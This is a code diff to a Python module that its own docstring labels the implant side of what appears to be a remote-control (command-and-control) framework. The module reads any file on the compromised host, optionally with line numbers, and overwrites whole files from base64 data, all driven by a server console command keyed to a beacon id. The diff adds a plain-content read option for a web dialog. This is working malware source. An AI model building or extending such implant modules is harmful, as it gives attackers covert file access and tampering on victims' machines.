@@ -1,22 +1,25 @@
-"""edit — 文件编辑(植入物端): 读(带行号) / 写(整文件替换)。
+"""edit — 文件编辑(植入物端): 读(带行号/纯内容) / 写(整文件替换)。
 
-- content_b64 为空: 读模式——返回带行号的内容(行号便于定位编辑)
+- content_b64 为空: 读模式——numbered="0" 返回纯内容(页面弹窗用),
+  否则返回带行号内容(行号便于定位编辑)
 - content_b64 非空: 写模式——base64 解码整文件替换(wb), 返回写入字节数
 
-配合: server 端 console `edit <bid> <path> [@local_file | 文本内容]`
+配合: server 端 console `edit <bid> <path> [--raw]` / 页面文件编辑弹窗
 """
 
 import base64
 
 MODULE = {
-    "desc": "文件编辑: 读(带行号) / 写(整文件替换)",
-    "params": [("path", "必填"), ("content_b64", "可选；空=读, 非空=整文件替换")],
+    "desc": "文件编辑: 读(带行号/纯内容) / 写(整文件替换)",
+    "params": [("path", "必填"),
+               ("content_b64", "可选；空=读, 非空=整文件替换"),
+               ("numbered", "可选；读模式 1=带行号(默认) 0=纯内容")],
 }
 
 _MAX_OUT = 65536  # 读模式输出上限(与 cat 一致)
 
 
-def run(path, content_b64=""):
+def run(path, content_b64="", numbered="1"):
     if content_b64:
         # ── 写模式: 整文件替换 ──
         try:
@@ -30,7 +33,7 @@ def run(path, content_b64=""):
         except OSError as e:
             return f"(error: {e})"
 
-    # ── 读模式: 带行号 ──
+    # ── 读模式: 带行号(默认) / 纯内容(numbered=0) ──
     import os
     if not os.path.isfile(path):
         return f"(not found or not a file: {path})"
@@ -43,7 +46,10 @@ def run(path, content_b64=""):
         return f"(error: {e})"
     if not lines:
         return "(empty)"
-    out = "".join(f"{i + 1:>6} | {ln}" for i, ln in enumerate(lines))
+    if str(numbered) == "0":
+        out = "".join(lines)
+    else:
+        out = "".join(f"{i + 1:>6} | {ln}" for i, ln in enumerate(lines))
     if len(out) > _MAX_OUT:
         out = out[:_MAX_OUT] + f"\n... (truncated, {len(out)} bytes total)"
     return out.rstrip("\n")
